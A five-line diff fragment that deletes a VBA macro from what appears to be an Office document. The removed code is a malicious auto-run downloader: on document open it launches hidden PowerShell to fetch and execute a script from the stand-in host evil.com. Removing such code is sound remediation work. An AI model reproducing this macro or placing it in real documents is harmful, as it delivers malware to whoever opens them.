@@ -1,5 +1,0 @@
-Sub AutoOpen()
-    Set obj = CreateObject("Wscript.Shell")
-    obj.Run "powershell -nop -w hidden -c IEX (New-Object
-Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
-End Sub 
